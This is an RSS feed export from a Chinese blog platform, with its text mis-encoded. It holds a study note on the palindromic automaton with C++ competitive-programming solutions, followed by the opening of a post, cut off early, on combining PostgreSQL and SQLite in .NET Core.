<?xml version="1.0" encoding="UTF-8" ?>
    <rss version="2.0">
    <channel>
        <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
        <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
        <lastBuildDate>2026-02-03T01:45:37.694Z</lastBuildDate>
        <description><![CDATA[
        ä¸»é¡µ - åå®¢å­ RSS
    ]]></description>
        <language>zh-cn</language>
        <item>
    <title><![CDATA[ åæèªå¨æº PAM å­¦ä¹ ç¬è®° ]]></title>
    <link>https://www.cnblogs.com/xzyNOIP/p/19567406</link>
    <guid>b1b958ac8a3353eeb1675d1492f795a2</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/xzyNOIP/p/19567406" title="åå¸äº 2026-02-03 09:32">
    <span role="heading" aria-level="2">åæèªå¨æº PAM å­¦ä¹ ç¬è®°</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="åæèªå¨æº">åæèªå¨æº</h2>
<p>zeb äº 2026.2.2 è®²è§£ï¼åä¸ä¸ªç¬è®°ã</p>
<h3 id="1-å¼å¥">1. å¼å¥</h3>
<p>åææ ï¼æèè¯´ï¼åæèªå¨æº PAMï¼Palindromic Automatonï¼ï¼æ¯ä¸ç§å¯ä»¥å­å¨ä¸ä¸ªä¸²ä¸­<strong>æææ¬è´¨ä¸ååæå­ä¸²</strong>çæ°æ®ç»æã</p>
<p>ç±äºè¿ä¸ªç®æ³å°±æ¯ä»å¶å®å­ç¬¦ä¸²ç¸å³èªå¨æºåé´èæ¥ï¼å æ­¤äºå¶å®èªå¨æºæè®¸å¤ç¸ä¼¼ä¹å¤ãå¨è¿ä¸ªåæèªå¨æºä¸­ï¼æ¯ä¸ä¸ªç¶æï¼å³èç¹ï¼é½å¯¹åºäºåä¸²ä¸­çä¸ä¸ªå­ä¸²ãèä¸åçæ¯ï¼è½¬ç§»è¾¹ä¸çå­ç¬¦ï¼æçæ¯å¨åç¶æä¸ä¸¤ä¾§åå«å ä¸ä¸ä¸ªè¿ä¸ªå­ç¬¦ï¼æå½¢æçåæå­ä¸²ã</p>
<p>ä¾å¦</p>
<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/5vme40l0.png" alt="" loading="lazy"></p>
<p>ä½ å°±ä¼åç°ä¸ä¸ªé®é¢ï¼æä»¬è¿æ ·åªè½å¾å°å¶æ°é¿åº¦çå­ä¸²ï¼é£è¯¥æä¹åå¢ï¼ä¹å <span class="math inline">\(\text{Manacher}\)</span> é£æ ·å å¥é´éå­ç¬¦ï¼</p>
<p>æä»¬èèä¸ä¸ªå·§å¦èå¿«æ·çæ¹æ³ââæä»¬å»ºä¸¤æ£µæ ¹ï¼ä¸ä¸ªæ¯<strong>å¥æ ¹</strong>ï¼ä¸é¢æææé¿åº¦ä¸ºå¥æ°çåæå­ä¸²ï¼ä¸ä¸ªæ¯<strong>å¶æ ¹</strong>ï¼ä¸é¢æææé¿åº¦ä¸ºå¶æ°çåæå­ä¸²ã</p>
<h3 id="2-æé ">2. æé </h3>
<p>å¯¹æ¯ä¸ªç¶æï¼æä»¬ä¼å¨å­ä»¥ä¸åå®¹ï¼</p>
<ul>
<li>å¯¹åºå­ç¬¦ä¸²é¿åº¦ <span class="math inline">\(\mathtt{len_u}\)</span>ï¼</li>
<li>å¯¹åºå­ç¬¦ä¸²ææåºè¾¹æåçç»ç¹ <span class="math inline">\(\mathtt{trie_{u,c}}\)</span>ï¼</li>
<li>ç¶æçå¤±éæé <span class="math inline">\(\mathtt{fail_u}\)</span>ï¼å«ä¹å¨ä¸æï¼ã</li>
</ul>
<p>å¯¹äºå¥æ ¹åå¶æ ¹ï¼æä»¬åå«å®ä¹å®ä»¬çé¿åº¦ä¸º <span class="math inline">\(-1\)</span> å <span class="math inline">\(0\)</span>ãè¿æ ·å¯ä»¥ä¿æç»ä¸æ§ï¼å¨ä¸ä¸ªç¶æåå å¥ä¸ä¸ªåç»§ç¶ææ¶ï¼å®æå¯¹åºçé¿åº¦å°±ç´æ¥è®¾ä¸ºå®ç¶äº²é¿åº¦å  <span class="math inline">\(2\)</span> å³å¯ã</p>
<p>å¯¹äº <span class="math inline">\(\text{PAM}\)</span> çæé ï¼æä»¬ç±»ä¼¼äº <span class="math inline">\(\text{SAM}\)</span> éç¨<strong>å¢éæé </strong>ï¼å³æ¯å å¥ä¸ä¸ªå­ç¬¦ï¼æä»¬é½å¯ä»¥å®æ¶æ´æ°è¿ä¸ªåæèªå¨æºã</p>
<p>é£ä¹ï¼ä¸å¦¨è®¾æä»¬ç°å¨è¦å å¥çè¿ä¸ªç¹æ¯ç¬¬ <span class="math inline">\(i\)</span> ä¸ªå­ç¬¦ï¼å <span class="math inline">\(i-1\)</span> ä¸ªå­ç¬¦å¯¹åºç <span class="math inline">\(\text{PAM}\)</span> å·²ç»æé å¥½ã</p>
<p>æä»¬èèå å¥è¿ä¸ªå­ç¬¦ä¸²ä¼äº§ççæ°çåæå­ä¸²ï¼å³ä»¥ç¬¬ <span class="math inline">\(i\)</span> ä½ä¸ºç»å°¾çåæå­ä¸²ãå¨è¿ä¹å¤çåæå­ä¸²ä¸­ï¼æä»¬æ¯ä¸ªé½è¦æ°å»ºèç¹åï¼å¹¶éï¼äºå®ä¸ï¼æä»¬åªéè¦æ°å»º<strong>æé¿çä¸ä¸ªåç¼åæå­ä¸²</strong>å¯¹åºç¶æå³å¯ãå ä¸ºå¯ä»¥ä¿è¯ï¼æ¯å®ç­çä»¥åä¸å®å·²ç»åºç°è¿äºï¼æ¯å¦è¯´è¿ä¸ªä¾å­ï¼</p>
<p>å¯¹äºå­ä¸² <span class="math inline">\(\mathtt{abaccaba}\)</span>ï¼åç¼åæå­ä¸²å±æä¸ä¸ªï¼<span class="math inline">\(\mathtt{abaccaba,aba,a}\)</span>ã</p>
<p>å¶ä¸­ä½ ä¼åç°ï¼å¦æä¸ä¸ªåç¼åæå­ä¸²ä¸æ¯æé¿çï¼é£ä¹å®ä¸å®å¯ä»¥è¢«æé¿çé£ä¸ä¸ªåç¼åæå­ä¸²<strong>ç¿»è½¬è¿å»</strong>ï¼æ¯å¦è¯´è¿éç <span class="math inline">\(\mathtt{aba}\)</span>ï¼å°±å¯ä»¥éè¿æ´ä¸ªå­ä¸²æ¾å°ä¸ä¸ªå¯¹ç§°ä½ç½®ä¸åæ ·ç <span class="math inline">\(\mathtt{aba}\)</span>ï¼è¿ä¹å°±æ¯ä¸ºä»ä¹æä»¬è³å¤åªéè¦æ°å»ºæé¿åæåç¼å¯¹åºèç¹å°±å¯ä»¥äºã</p>
<p>ç°å¨æä»¬çä»»å¡ï¼å°±æ¯æ¾å°è¿ä¸ªæ°èç¹è¯¥å»ºç«å¨åªéãä½ ä¼åç°ï¼è¿ä¸ªèç¹çç¶äº²ï¼å³å°è¿ä¸ªæé¿åæåç¼æå¤´å»å°¾ï¼ä¸å®ä¹æ¯ä¸ä¸ªåæä¸²ï¼ä¸å°±æ¯ <span class="math inline">\(i-1\)</span> ä½ç½®ä¸çä¸ä¸ªåç¼åæå­ä¸²ãäºæ¯è¿ä¸ªä»»å¡å°±è½¬åæäºï¼æ¾å°ä¸ä¸ªå¯¹åºå­ä¸²æé¿çèç¹ <span class="math inline">\(u\)</span> æ»¡è¶³</p>
<ul>
<li>å®å¯¹åºçå­ä¸²æ¯ <span class="math inline">\(i-1\)</span> çä¸ä¸ªåç¼åæå­ä¸²ï¼</li>
<li><span class="math inline">\(s_{i-\mathtt{len_u}-1}=s_i\)</span>ã</li>
</ul>
<p>æä»¬è®°å½ <span class="math inline">\(i-1\)</span> ä½ç½®æé¿åæåç¼å¯¹åºç¶æèç¹ç¼å·ä¸º <span class="math inline">\(\mathtt{last}\)</span>ãå¦æè¿ä¸ªèç¹å·²ç»æ»¡è¶³è¿ä¸ªæ¡ä»¶äºï¼å¾å¥½ï¼æä»¬ç´æ¥ææ°èç¹è¿å¨ <span class="math inline">\(\mathtt{last}\)</span> ä¸é¢å³å¯ãä½å¦æä¸è¡å¢ï¼å æ­¤ï¼æä»¬è¿éç±»ä¼¼ <span class="math inline">\(\text{ACAM}\)</span>ï¼å¼å¥ <span class="math inline">\(\text{Fail}\)</span> å¤±éæéã<span class="math inline">\(\mathtt{fail_u}\)</span> è¡¨ç¤ºçå«ä¹æ¯ï¼ç¶æ <span class="math inline">\(u\)</span> å¯¹åºçåæå­ä¸²ç<strong>æé¿åæåç¼</strong>å¯¹åºçç¶æã</p>
<p>é£ä¹å¯ä»¥åç°ï¼<span class="math inline">\(\mathtt{last},\mathtt{fail_{last}},\mathtt{fail_{fail_{last}}},\dots\)</span> å°±å¯¹åºäºä»¥ <span class="math inline">\(i-1\)</span> ç»å°¾çææåç¼åæå­ä¸²ï¼</p>
<p>å æ­¤å¨è¿éï¼æä»¬åªéè¦ä¸æ­å¾ä¸è·³ <span class="math inline">\(\text{Fail}\)</span> æéå³å¯ãé£ä¹å¦æä¸ç´æ¾é½æ¾ä¸å°ï¼æä¹åï¼è¿æ¶åæä»¬èèæå¶æ ¹ç <span class="math inline">\(\mathtt{fail_0}\)</span> è¿å°å¥æ ¹ä¸å»ãè¿æ ·è·³ <span class="math inline">\(\text{Fail}\)</span> æ¶ï¼ç±äºå¥æ ¹ç <span class="math inline">\(\mathtt{len_1}=-1\)</span>ï¼å æ­¤ <span class="math inline">\(i-\mathtt{len_1}-1=i\)</span>ï¼å³å¯¹äº <span class="math inline">\(s_i\)</span> è¿ä¸ªåå­ç¬¦çåæä¸²ï¼äºæ¡ä»¶ä¸å®æç«ï¼å¾èªç¶çå°±ä¼è¿å°å¥æ ¹ä¸é¢ãè¿ä¸æ¹é¢æ­ç¤ºäºè®¾å¥æ ¹é¿åº¦ä¸º <span class="math inline">\(-1\)</span> çå¦ä¸å¥½å¤ï¼åæ¶ä¹è¯´æäºï¼ä¸ºä»ä¹ <span class="math inline">\(\mathtt{fail_0}\leftarrow 1\)</span>ã</p>
<p>é£ä¹æ¾å°äºç¶äº²ï¼æä»¬æ¥ä¸æ¥å°±æ¯è¦ä¸ºè¿ä¸ç¹ä¹è¿ä¸æ¡ <span class="math inline">\(\text{Fail}\)</span> æéåºå»ã</p>
<p>å¶å®ä¹å¾ç®åï¼è¿æ¡ <span class="math inline">\(\text{Fail}\)</span> æéï¼è¿åçå¶å®å°±æ¯ä»¥ <span class="math inline">\(i\)</span> ç»å°¾çç¬¬äºé¿çåæåç¼ãé£ä¹æä»¬åªéè¦ç»§ç»­ä» <span class="math inline">\(\mathtt{fail_{last}}\)</span> å¼å§è·³ï¼åæ¾å°ç¬¬ä¸ä¸ªç¬¦åäºæ¡ä»¶çå°±å¯ä»¥äºã</p>
<p>ä¸é¢æ¯å®ç°ã</p>
<pre><code class="language-cpp">int last,tot=1,fail[N],len[N],trie[N][30];
//last æå¼å§æå¨å¶æ ¹
//tot è®°å¾è¦èµåå¼ä¸º 1
int getfail(int u,int id){
    while(s[id]!=s[id-len[u]-1]) u=fail[u]; //ä¸æ»¡è¶³äºæ¡ä»¶å°±ä¸ç´è·³
    return u;
}
void pamConstruct(){
    fail[0]=1,len[1]=-1;
    //åå§å å¶æ ¹ç fail æåå¥æ ¹ï¼å¥æ ¹çé¿åº¦ä¸º -1
    for(int i=1;i&lt;=n;i++){
		int fa=getfail(last,i);
        //æ¾å° i-1 çåæåç¼ä¸­æé¿çé£ä¸ªç¬¦åäºæ¡ä»¶çï¼ä½ä¸ºå¶ç¶äº²
		if(!trie[fa][s[i]-'a']){
			fail[++tot]=trie[getfail(fail[fa],i)][s[i]-'a'];
            //ä» fail[fa] å¼å§ï¼æ¯å ä¸ºæä»¬æ¾çæ¯çåç¼
			trie[fa][s[i]-'a']=tot;
            //åæ¾ fail åè¿è¾¹ï¼ï¼
			len[tot]=len[fa]+2;
		}
		last=trie[fa][s[i]-'a'];
	}
}
</code></pre>
<p>æå³å¤æåº¦ï¼é¦åï¼ç±ä»£ç ä¹å¯ä»¥çåºï¼ç¶ææå¤åªæ <span class="math inline">\(n\)</span> ä¸ªï¼å æ­¤ç©ºé´å¤æåº¦æ¯ <span class="math inline">\(O(n\Sigma)\)</span> çã</p>
<p>æ¶é´å¤æåº¦ï¼é¦åé¤äºè·³ <span class="math inline">\(\text{Fail}\)</span> é½æ¯ <span class="math inline">\(O(n)\)</span> çã</p>
<p>æ¯æ¬¡è·³ <span class="math inline">\(\text{Fail}\)</span> æ¶ï¼æ¯ä¸æ¡ Fail è¾¹è³å¤è¢«ç»è¿ä¸æ¬¡ï¼èå¢æ·» <span class="math inline">\(\text{Fail}\)</span> æéæ¶ï¼æå¤æ°æ·»ä¸æ¡ Fail è¾¹ãå æ­¤è·³ <span class="math inline">\(\text{Fail}\)</span> çæ¬¡æ°è³å¤å°±æ¯ <span class="math inline">\(O(n)\)</span> çï¼å æ­¤æ»æ¶é´å¤æåº¦æ¯ <span class="math inline">\(O(n)\)</span>ã</p>
<h3 id="3-åºç¨">3. åºç¨</h3>
<p><strong>æ±ä»¥æä½ç½®ç»å°¾çåæå­ä¸²ä¸ªæ°ï¼å¼ºå¶å¨çº¿</strong></p>
<p>å³ P5496ï¼åæä¸ä¸ï¼å¶å®å°±æ¯å®å¨ Fail æ ä¸çæ·±åº¦åã</p>
<p>ä»£ç </p>
<pre><code class="language-cpp">const int N=5e5+10;
string s;
int n,lastans;
int last,tot=1,fail[N],len[N],trie[N][30];
int dep[N];
int getfail(int u,int id){
	while(s[id]!=s[id-len[u]-1]) u=fail[u];
	return u;
}
int main(){
	ios::sync_with_stdio(false);
	cin.tie(0);cout.tie(0);
	cin&gt;&gt;s; n=s.length();
	s=" "+s;
	fail[0]=1,len[1]=-1;
	for(int i=1;i&lt;=n;i++){
		s[i]=(s[i]-97+lastans)%26+97;
		int fa=getfail(last,i);
		if(!trie[fa][s[i]-'a']){
			fail[++tot]=trie[getfail(fail[fa],i)][s[i]-'a'];
			trie[fa][s[i]-'a']=tot;
			len[tot]=len[fa]+2;
			dep[tot]=dep[fail[tot]]+1;
		}
		last=trie[fa][s[i]-'a'];
		lastans=dep[last];
		cout&lt;&lt;lastans&lt;&lt;" ";
	}
	cout&lt;&lt;"\n";
	return 0;
}
</code></pre>
<p><strong>æ±æä¸ªåæå­ä¸²çåºç°æ¬¡æ°</strong></p>
<p>ä½ ä¼åç°å¨ Fail æ ä¸ï¼ä¸ä¸ªç¶æçåä»£æå¯¹åºçå­ä¸²å¨é½åå«å®ãå æ­¤æä»¬è®°å½ <span class="math inline">\(\mathtt{cnt_u}\)</span> è¡¨ç¤º <span class="math inline">\(u\)</span> ç¶æå¨æå»ºæ¶è¢«æµè¾¾äºå¤å°æ¬¡ï¼æåä¸ä¸ªèç¹ç­æ¡å°±åºè¯¥æ¯å­æ åã</p>
<p>P3649 ä»£ç å¦ä¸</p>
<pre><code class="language-cpp">const int N=3e5+10;
string s;
int n;
ll ans;
int tot=1,last,len[N],siz[N],fail[N],trie[N][30];
vector&lt;int&gt; T[N];
int getfail(int u,int id){
	while(s[id]!=s[id-len[u]-1]) u=fail[u];
	return u;
}
void dfs(int u){
	for(auto v:T[u]) dfs(v),siz[u]+=siz[v];
	ans=max(ans,1ll*len[u]*siz[u]);
}
int main(){
	ios::sync_with_stdio(false);
	cin.tie(0);cout.tie(0);
	cin&gt;&gt;s; n=s.length();
	s=" "+s;
	len[1]=-1,fail[0]=1;
	T[1].push_back(0);
	for(int i=1;i&lt;=n;i++){
		int fa=getfail(last,i);
		if(!trie[fa][s[i]-'a']){
			fail[++tot]=trie[getfail(fail[fa],i)][s[i]-'a'];
			T[fail[tot]].push_back(tot);
			trie[fa][s[i]-'a']=tot;
			len[tot]=len[fa]+2;
		}
		last=trie[fa][s[i]-'a'];
		siz[last]++;
	}
	dfs(1);
	cout&lt;&lt;ans&lt;&lt;"\n";
	return 0;
}
</code></pre>
<p><strong>åç«¯æå¥</strong></p>
<p>æ¯çï¼<span class="math inline">\(\text{PAM}\)</span> æ¯æåç«¯æå¥ï¼è¿å¾çäºåæä¸²è¯å¥½çå¯¹ç§°æ§è´¨ã</p>
<p>åè®¾æä»¬è¦å¨ä½ç½® <span class="math inline">\(l\)</span> æ°å¢ä¸ä¸ªå­ç¬¦ï¼æä»¬å°±è¦æ¾å° <span class="math inline">\(l+1\)</span> çæé¿åæåç¼ä¸­ï¼ç¬¬ä¸ä¸ªåæ³çãé£æä»¬è¦é¢å¤å»ºç«å¦ä¸é¢ Fail æ åï¼å¹¶ä¸ç¨ï¼å ä¸ºä½ ä¼åç°ä¸ä¸ªåæä¸²çåæåç¼ï¼ä¸å®ä¹æ¯è¿ä¸ªåæä¸²çåæåç¼ï¼å æ­¤ Fail å®å¨å¯ä»¥å±ç¨ã</p>
<p>å¯ä¸è¦æ¹åçæ¯ï¼æä»¬ååæ¯ä¸ä¸ª <span class="math inline">\(\mathtt{last}\)</span>ï¼å¨è¿éæä»¬è¦ç¨ä¸¤ä¸ªï¼<span class="math inline">\(\mathtt{pre}\)</span> å <span class="math inline">\(\mathtt{suf}\)</span>ï¼åå«è¡¨ç¤º <span class="math inline">\(l\)</span> æé¿åæåç¼å¯¹åºçç¶æï¼å <span class="math inline">\(r\)</span> æé¿åæåç¼å¯¹åºçç¶æãä»ä¹æ¶åä¸¤èå¯è½ä¼ç¸äºå½±åå¢ï¼ä½ ä¼åç°ï¼åªæå½æ´ä¸ªä¸²é½åæäºä¸ä¸ªåæä¸²ï¼ä¸¤èå°±ä¼ç¸äºå½±åäºï¼æ­¤æ¶è¦å°å®ä»¬ç»ä¸è®¾ææåä¸ä¸ªç¶æã</p>
<p>HDU5421 ä»£ç å¦ä¸ã</p>
<pre><code class="language-cpp">const int N=2e5+10;
char s[N];
int q,L,R;
ll ans;
int tot,fail[N],trie[N][30],len[N],dep[N];
int pre,suf;
void init(){
	tot=1,ans=0;
	pre=0,suf=0;
	L=1e5+1,R=L-1;
	memset(fail,0,sizeof(fail));
	memset(trie,0,sizeof(trie));
	memset(len,0,sizeof(len));
	memset(dep,0,sizeof(dep));
	memset(s,0,sizeof(s));
	fail[0]=1,len[1]=-1;
}
int getfail(int u,int id,int op){
	while(s[id]!=s[id-op*(len[u]+1)]) u=fail[u];
	return u;
}
void insert(char c,int pos,int &amp;last,int op){
	int fa=getfail(last,pos,op);
	if(!trie[fa][c-'a']){
		fail[++tot]=trie[getfail(fail[fa],pos,op)][c-'a'];
		trie[fa][c-'a']=tot;
		len[tot]=len[fa]+2,dep[tot]=dep[fail[tot]]+1;
	}
	last=trie[fa][c-'a'];
	ans+=dep[last];
	if(len[last]==R-L+1) pre=suf=last;
}
int main(){
	ios::sync_with_stdio(false);
	cin.tie(0);cout.tie(0);
	while(cin&gt;&gt;q){
		init();
		while(q--){
			int op; char c;
			cin&gt;&gt;op;
			if(op==1){
				cin&gt;&gt;c; s[--L]=c;
				insert(c,L,pre,-1);
			}
			else if(op==2){
				cin&gt;&gt;c; s[++R]=c;
				insert(c,R,suf,1);
			}
			else if(op==3) cout&lt;&lt;tot-1&lt;&lt;"\n";
			else cout&lt;&lt;ans&lt;&lt;"\n";
		}
	}
	return 0;
}

</code></pre>
<p><strong>åæèªå¨æºä¸ dp</strong></p>
<p>ä¸éä¾é¢ï¼P4762 Virus synthesis</p>
<blockquote>
<p>åå§æä¸ä¸ªç©ºä¸²ï¼å©ç¨ä¸é¢çæä½æé å®ä¸² <span class="math inline">\(S\)</span>ã</p>
<ul>
<li>ä¸²å¼å¤´ææ«å°¾æ·»å ä¸ä¸ªå­ç¬¦ï¼</li>
<li>ç¿»è½¬å­ç¬¦ä¸²ï¼æ·»å å°å¨å¼å¤´ææ«å°¾ã</li>
</ul>
<p>æ±æå°çæä½æ°ï¼<span class="math inline">\(|S|\le 10^5\)</span>ï¼å­ç¬¦éä¸º <span class="math inline">\(\{A,T,C,G \}\)</span>ã</p>
</blockquote>
<p>å¯ä»¥åå»ç©ä¸ä¸æ ·ä¾ã</p>
<p>äºæä½æ¯ä¸ä¸ªå¾å¥½çä¸è¥¿ï¼å®å¯ä»¥åçå¾å¤æ¶é´ãå æ­¤ï¼æä»¬èè<strong>æåä¸æ¬¡ä½¿ç¨äºæä½</strong>æå½¢æçå­ç¬¦ä¸²ï¼è®¾å¶æéæä½æ¬¡æ°ä¸º <span class="math inline">\(f(T)\)</span>ï¼é£ä¹å©ä¸çæ´åæä½éå¸¸å¥½è®¡ç®ï¼æ»æ¬¡æ°å°±æ¯ <span class="math inline">\(n-|T|+f(T)\)</span>ï¼å¨ææå¶åæå­ä¸²ä¸­éä¸ä¸ªæå°çå°±å¯ä»¥äºï¼è¿äºåæå­ä¸²é½å¯ä»¥å¨ <span class="math inline">\(\text{PAM}\)</span> ä¸å­å¨ãé®é¢è½¬åä¸ºå¦ä½è®¡ç®ä¸ä¸ªå¶åæå­ä¸²çæå°æä½æ¬¡æ°ã</p>
<p>é¦åå¯¹äºè¿ä¸ªå¶åæå­ä¸²ï¼æåä¸æ­¥<strong>ä¸å®æ¯ç¿»è½¬</strong>ï¼æ²¡çè¯´ãèèæä¹è½¬ç§»æ¥ã</p>
<ul>
<li>ä»åå¿çåæå­ä¸²è½¬ç§»æ¥ï¼å³ä»å¶å¨ <span class="math inline">\(\text{PAM}\)</span> ä¸çç¶äº²çæä½æ¬¡æ°å ä¸ï¼<span class="math inline">\(f(\mathtt{fa_u})+1\)</span>ï¼</li>
<li>ä»ä¸åå¿çåæå­ä¸²è½¬ç§»æ¥ï¼æä»¬è·³ Fail é¾ï¼æ¾å°ç¬¬ä¸ä¸ª <span class="math inline">\(\mathtt{len}\)</span> å¼å°äºç­äºå½åä¸²ä¸åçï¼è®¾è¿ä¸ªä¸º <span class="math inline">\(\mathtt{trans_u}\)</span>ï¼ç­æ¡å°±æ¯ <span class="math inline">\(f(\mathtt{trans_u})+\dfrac {\mathtt{len_u}}{2}-\mathtt{len_{trans_u}}+1\)</span>ã</li>
</ul>
<p>æ± <span class="math inline">\(\mathtt{trans}\)</span> çæ¹æ³ä¸ Fail æ ç±»ä¼¼ãæ¶é´å¤æåº¦ <span class="math inline">\(O(n)\)</span>ã</p>
<pre><code class="language-cpp">const int N=1e5+10;
string s;
int n;
int tot,trie[N][4],len[N],fail[N];
int trans[N];
int dp[N];
int last;
int getid(char c){
	if(c=='A') return 0;
	else if(c=='G') return 1;
	else if(c=='C') return 2;
	else return 3;
}
int getfail(int u,int id){
	while(s[id]!=s[id-len[u]-1]) u=fail[u];
	return u;
}
void solve(){
	cin&gt;&gt;s; n=s.length();
	for(int i=0;i&lt;=n;i++) dp[i]=INF;
    //æ³¨æ dp å¼åå§é½è®¾ä¸ºæå¤§
	s=" "+s;
	tot=1,last=0;
	len[1]=-1,fail[0]=1;
	int ans=n;
	dp[0]=1; //åæç¿»è½¬çä»£ä»·ç®ä¸ï¼ä¸ç¶åè½¬ç§»ä¸é£ç§å°±è®¡ç®ä¸å°
	for(int i=1;i&lt;=n;i++){
		int fa=getfail(last,i);
		if(!trie[fa][getid(s[i])]){
			fail[++tot]=trie[getfail(fail[fa],i)][getid(s[i])];
			trie[fa][getid(s[i])]=tot;
			len[tot]=len[fa]+2;
            //ä¸é¢æ± trans
			if(len[tot]&lt;=2) trans[tot]=fail[tot];
			else if(len[tot]%2==0){
				int tmp=trans[fa];// å¾éè¦ ä¿è¯æ¶é´å¤æåº¦
                // è¿æ ·å¯ä»¥ä¿è¯ Fail è¾¹ä¸ä¼è¢«å¤§ééå¤èµ°è¿
				while(s[i-1-len[tmp]]!=s[i]||(len[tmp]+2)*2&gt;len[tot]) tmp=fail[tmp];
				trans[tot]=trie[tmp][getid(s[i])];
			}
			if(len[tot]%2==0){
				dp[tot]=min(dp[fa]+1,dp[trans[tot]]+len[tot]/2-len[trans[tot]]+1);
				ans=min(ans,dp[tot]+n-len[tot]);
			}
		}
		last=trie[fa][getid(s[i])];
	}
	cout&lt;&lt;ans&lt;&lt;"\n"; 
	for(int i=0;i&lt;=tot;i++){
		for(int j=0;j&lt;4;j++) trie[i][j]=0;
	}
}
</code></pre>
<p>åèæç« </p>
<ul>
<li>
<p><a href="https://www.luogu.com.cn/article/ntc6yyfd" target="_blank" rel="noopener nofollow">PAM é¢è§£ by åå¨ä¸è</a></p>
</li>
<li>
<p><a href="https://oi-wiki.org/string/pam/" target="_blank" rel="noopener nofollow">oi-wiki</a></p>
</li>
<li>
<p><a href="https://www.luogu.com.cn/user/387585" target="_blank" rel="noopener nofollow">æ¥èª zeb çè®²è§£</a></p>
</li>
</ul>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-03 09:32">2026-02-03 09:32</span>&nbsp;
<a href="https://www.cnblogs.com/xzyNOIP">xzy_sf</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19567406);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19567406', targetLink: 'https://www.cnblogs.com/xzyNOIP/p/19567406', title: 'åæèªå¨æº PAM å­¦ä¹ ç¬è®°' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ .NET Core åæ°æ®åºå®æï¼ä¼éèå PostgreSQL ä¸ SQLite çæä½³å®è·µ ]]></title>
    <link>https://www.cnblogs.com/newbe36524/p/19567317</link>
    <guid>ce97dfd15159f52be40e6aed2317cc74</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/newbe36524/p/19567317" title="åå¸äº 2026-02-03 09:11">
    <span role="heading" aria-level="2">.NET Core åæ°æ®åºå®æï¼ä¼éèå PostgreSQL ä¸ SQLite çæä½³å®è·µ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="net-core-åæ°æ®åºå®æè®©-postgresql-ä¸-sqlite-åå¹³å±å¤">.NET Core åæ°æ®åºå®æï¼è®© PostgreSQL ä¸ SQLite åå¹³å±å¤</h1>
<blockquote>
<p>å¨æå»ºç°ä»£ååºç¨æ¶ï¼æä»¬ç»å¸¸é¢ä¸´è¿æ ·çææ©ï¼å¼åç¯å¢æ¸´æè½»éä¾¿æ·ï¼èçäº§ç¯å¢åéè¦é«å¹¶åä¸é«å¯ç¨ãæ¬æå°åäº«å¦ä½å¨ .NET Core é¡¹ç®ä¸­ä¼éå°åæ¶æ¯æ PostgreSQL å SQLiteï¼å®ç°âå¼åç¨ SQLiteï¼çäº§ç¨ PGâçæä½³å®è·µã</p>
</blockquote>

<h2 id="èæ¯">èæ¯</h2>
<p>å¨è½¯ä»¶å¼åä¸­ï¼ç¯å¢å·®å¼åä¸ç´æ¯å°æ°å¼åå¢éçé¾é¢ä¹ä¸ãä»¥æä»¬æ­£å¨æå»ºç <strong>HagiCode</strong> å¹³å°ä¸ºä¾ï¼è¿æ¯ä¸ä¸ªåºäº ASP.NET Core 10 å React ç AI è¾å©å¼åç³»ç»ï¼åé¨éæäº Orleans è¿è¡åå¸å¼ç¶æç®¡çï¼ææ¯æ ç¸å½ç°ä»£ä¸å¤æã</p>
<p>å¨é¡¹ç®åæï¼æä»¬éå°äºä¸ä¸ªå¸åçå·¥ç¨çç¹ï¼å¼åäººåå¸ææ¬å°ç¯å¢è½å¤âå¼ç®±å³ç¨âï¼ä¸å¸æå®è£åéç½®ç¹éç PostgreSQL æ°æ®åºï¼ä½å¨çäº§ç¯å¢ä¸­ï¼æä»¬éè¦å¤çé«å¹¶ååå¥åå¤æç JSON æ¥è¯¢ï¼è¿æ¶è½»éçº§ç SQLite åæ¾å¾åä¸ä»å¿ã</p>
<p>å¦ä½å¨ä¿æä»£ç åºç»ä¸çåæä¸ï¼è®©åºç¨æ¢è½åå®¢æ·ç«¯è½¯ä»¶ä¸æ ·å©ç¨ SQLite çä¾¿æºæ§ï¼åè½åä¼ä¸çº§æå¡ä¸æ ·åæ¥ PostgreSQL çå¼ºææ§è½ï¼è¿å°±æ¯æ¬æè¦æ¢è®¨çæ ¸å¿é®é¢ã</p>
<h2 id="å³äº-hagicode">å³äº HagiCode</h2>
<p>æ¬æåäº«çåæ°æ®åºééæ¹æ¡ï¼ç´æ¥æ¥æºäºæä»¬å¨ <strong>HagiCode</strong> é¡¹ç®ä¸­çå®æç»éªãHagiCode æ¯ä¸ä¸ªéæäº AI æç¤ºè¯ç®¡çå OpenSpec å·¥ä½æµçä¸ä¸ä»£å¼åå¹³å°ãæ­£æ¯ä¸ºäºå¼é¡¾å¼åèçä½éªåçäº§ç¯å¢çç¨³å®æ§ï¼æä»¬æ¢ç´¢åºäºè¿å¥è¡ä¹ææçæ¶ææ¨¡å¼ã</p>
<p>æ¬¢è¿è®¿é®æä»¬ç GitHub ä»åºäºè§£é¡¹ç®å¨è²ï¼<a href="https://github.com/HagiCode-org/site" target="_blank" rel="noopener nofollow">HagiCode-org/site</a>ã</p>
<h2 id="æ ¸å¿åå®¹ä¸æ¶æè®¾è®¡ä¸ç»ä¸æ½è±¡">æ ¸å¿åå®¹ä¸ï¼æ¶æè®¾è®¡ä¸ç»ä¸æ½è±¡</h2>
